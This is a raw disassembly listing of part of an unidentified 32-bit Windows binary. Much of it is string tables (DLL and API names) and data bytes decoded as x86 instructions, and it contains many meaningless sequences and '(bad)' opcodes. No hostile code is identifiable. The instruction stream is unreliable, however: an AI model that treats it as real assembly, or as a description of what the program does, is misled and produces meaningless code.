  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	sub    DWORD PTR [eax-0x33],edi
  413f65:	or     al,0x67
  413f67:	xlat   BYTE PTR ds:[ebx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	inc    DWORD PTR [eax]
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	cs pop esp
  413f70:	ret    0x3cb4
  413f73:	(bad)  
  413f74:	sbb    BYTE PTR [ebp+0x3d],ch
  413f77:	retf   
  413f78:	enter  0xaf2b,0x18
  413f7c:	ret    0x625
  413f7f:	fadd   QWORD PTR [edx+0x71]
  413f82:	push   ecx
  413f83:	call   DWORD PTR [eax+0x702da8f9]
  413f89:	shr    BYTE PTR [ebx-0x3feca1ce],0x34
  413f90:	into   
  413f91:	or     eax,0xa6a1fb81
  413f96:	adc    ch,BYTE PTR [eax+eax*1+0x77594117]
  413f9d:	cmp    DWORD PTR [esi+0x3d],esi
  413fa0:	and    eax,0x4f81eb11
  413fa5:	(bad)  
  413fa6:	repz xor al,0xc8
  413fa9:	xor    edi,eax
  413fab:	xor    al,0x8b
